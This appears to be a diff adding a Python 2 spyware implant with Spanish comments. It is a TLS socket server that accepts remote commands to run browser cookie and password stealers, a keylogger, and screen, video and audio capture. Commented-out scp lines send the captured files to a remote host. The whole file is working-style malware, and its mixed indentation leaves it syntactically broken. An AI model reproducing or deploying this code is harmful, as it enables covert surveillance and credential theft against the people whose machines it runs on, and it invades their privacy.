@@ -1,0 +1,90 @@
+
+#importamos el modulo socket
+import socket
+import keylogger
+import re, os, ssl
+import capaudio
+import captura
+import capvideo
+
+context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+context.load_cert_chain(certfile="certificado.pem", keyfile="llave.pem")
+#instanciamos un objeto para trabajar con el socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
+#Con el metodo bind le indicamos que puerto debe escuchar y de que servidor esperar conexiones
+#Es mejor dejarlo en blanco para recibir conexiones externas si es nuestro caso
+s.bind(("", 6666))
+ 
+#Aceptamos conexiones entrantes con el metodo listen, y ademas aplicamos como parametro
+#El numero de conexiones entrantes que vamos a aceptar
+s.listen(1)
+ 
+#Instanciamos un objeto sc (socket cliente) para recibir datos, al recibir datos este 
+#devolvera tambien un objeto que representa una tupla con los datos de conexion: IP y puerto
+#sc, addr = s.accept()
+ 
+sc, addr = s.accept()
+connstream = context.wrap_socket(sc, server_side=True)
+ 
+while True:
+ 
+    #Recibimos el mensaje, con el metodo recv recibimos datos y como parametro 
+    #la cantidad de bytes para recibir
+    
+    recibido = connstream.recv(1024)
+ 
+    #Si el mensaje recibido es la palabra close se cierra la aplicacion
+    #if recibido == "close":
+    #    break
+ 
+    #Si se reciben datos nos muestra la IP y el mensaje recibido
+    #print str(addr[0]) + " dice: ", recibido
+    
+    if recibido == "cookies":
+       		os.system("python firecookies.py")	
+                #os.system('scp key.txt koala@192.168.63.175:~/keylogger')
+                connstream.send("Archivo enviado")
+
+    elif recibido == "contrasenas":
+       		os.system("python firepass.py")
+                #os.system('scp key.txt koala@192.168.63.175:~/contrasenas')
+        	connstream.send("Archivo enviado")
+
+    elif re.search('keylogger',recibido):
+                mo = re.match('keylogger (\d+)',recibido)
+        	keylogger.keylog(mo.group(1))
+                #os.system('scp key.txt koala@192.168.63.175:~/keylogger')
+        	connstream.send("Archivo enviado")
+    
+    elif re.search('captura',recibido):
+                mo = re.match('captura ([tn]{1,1}) (\d+)',recibido);
+                captura.tiempo(mo.group(1),mo.group(2))
+                #os.system('scp /tmp/2015* koala@192.168.63.175:~/capturas')
+        	connstream.send("Archivo enviado")
+
+ 
+    elif re.search('captvid',recibido):
+                mo = re.match('captvid (\d+)',recibido);
+                capvideo.video(mo.group(1))
+                #print(mo.group(0))
+                #os.system('scp 2015* koala@192.168.63.175:~/video')
+        	connstream.send("Archivo enviado")
+    
+    elif re.search('captaud',recibido):
+                mo = re.match('captaud (\d+)',recibido);
+        
+                capaudio.audio(mo.group(1))
+                #os.system('scp 2015* koala@192.168.63.175:~/audio')
+                #print(mo.group(0))
+        	connstream.send("Archivo enviado")
+
+    #Devolvemos el mensaje de error al cliente
+    else :
+                connstream.send("Ingrese un comando valido")
+                recibido = ""
+ 
+#Cerramos la instancia del socket cliente y servidor
+connstream.close()
+sc.close()
+s.close()
